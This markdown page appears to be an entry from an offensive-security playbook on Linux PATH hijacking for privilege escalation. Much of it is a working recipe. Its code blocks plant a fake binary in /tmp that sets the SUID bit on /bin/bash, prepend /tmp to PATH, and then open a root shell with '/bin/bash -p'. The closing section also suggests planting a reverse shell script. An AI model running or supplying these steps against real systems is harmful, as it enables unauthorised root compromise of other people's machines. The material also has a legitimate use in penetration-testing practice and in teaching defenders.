---
id: linux-path-hijack
title: Linux PATH Hijacking
stage: privesc
tags: [linux]
summary: Plant a malicious binary earlier in PATH than the real one — exploitable when a SUID binary or root cron job calls a program by bare name without a full path.
leads_to:
  - root-linux
---

## Prerequisites

A low-privilege shell. A SUID binary that calls another program by bare name (visible via `strings`), OR a root cron job that uses a relative binary name. A writable directory that can be prepended to PATH (usually `/tmp` or `/dev/shm`).

PATH hijacking exploits the fact that Linux searches directories in PATH order to find a binary name. If a privileged process calls `backup` instead of `/usr/bin/backup`, and you can put your own `backup` in `/tmp` before `/usr/bin` in the search order, your binary runs with the caller's privileges. Use `pspy64` to watch what cron jobs actually execute, and `strings` on SUID binaries to see what programs they invoke.

## Quick Win

> Identify the relative binary name, plant yours in /tmp, export the path, wait for execution.

```bash
strings /usr/bin/suid_binary | grep -v "^/"   # look for bare binary names
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/target_binary
chmod +x /tmp/target_binary
# Run suid binary or wait for cron → /bin/bash -p
```

## Find Hijackable Calls

> Check SUID binaries and cron scripts for relative binary calls.

```bash
# Check SUID binaries for bare names (anything without a leading /)
strings /usr/bin/suid_binary | grep -v "^/"

# Check cron scripts
cat /etc/crontab && cat /etc/cron.d/*
# Look for lines like: "service apache2 restart" — calls 'service' without full path
```

## Exploit

> Prepend /tmp, plant the malicious binary, trigger the execution.

```bash
export PATH=/tmp:$PATH

cat > /tmp/service << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/service

# If triggered by cron: wait
# If triggered by SUID binary: run it now
/usr/bin/suid_binary

# After execution:
/bin/bash -p
```

## What to Look For

- World-writable directories already in PATH: `/tmp`, `/dev/shm`
- SUID binary calling another program by bare name (no `/usr/bin/` prefix)
- Cron running as root that calls binaries without full paths

## Leads To

Malicious binary executes as root → SUID bash created → `/bin/bash -p` → root-linux. Or plant a reverse shell script as the target binary name → rev-shell as root. Use `pspy64` to watch timing and confirm the hijack fires.
